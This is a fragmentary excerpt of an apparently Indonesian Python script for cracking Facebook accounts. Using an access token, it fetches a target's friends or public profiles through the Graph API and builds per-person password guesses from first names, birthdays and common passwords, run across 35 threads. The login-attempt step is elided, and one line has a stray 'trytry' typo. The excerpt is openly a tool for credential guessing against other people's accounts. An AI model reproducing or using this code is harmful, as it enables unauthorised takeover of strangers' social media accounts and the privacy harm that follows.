...
def login():
	...
	if p in ('01','1'): #kondisi 1 login dengan token :)
		...
		if (find_token is None):
			...
			nampung(to).menu()
	elif p=='0':exit(':( Terima kasih!')#kondisi keluar dari script
	else:
...
class nampung:
	...
	def sendTeman(self):
		...
		with Bool(max_workers=35) as tokai:
			...
			for id in idTeman:
				...
				try:pwList=[r2['first_name'],r2['first_name']+'123',r2['first_name']+'1234',r2['first_name']+'12345','sayang','bangsad','123456','kontol','102030','786786','anjing','bismillah','indonesia',r2['birthday']] #Password list ubah lah jika itu butuh :)
				except:pass
				try:
	...
	def sendPublik(self):
		...
		with Bool(max_workers=35) as tokai:
			...
			for id in idPublik:
				r2=json.loads(req.get(f'https://graph.facebook.com/{id}?access_token={self.token}').text)
				trytry:pwList=[r2['first_name'],r2['first_name']+'123',r2['first_name']+'1234',r2['first_name']+'12345','sayang','bangsad','123456','kontol','102030','786786','anjing','bismillah','indonesia',r2['birthday']] #Password list ubah lah jika itu butuh :)
				except:pass
				try:
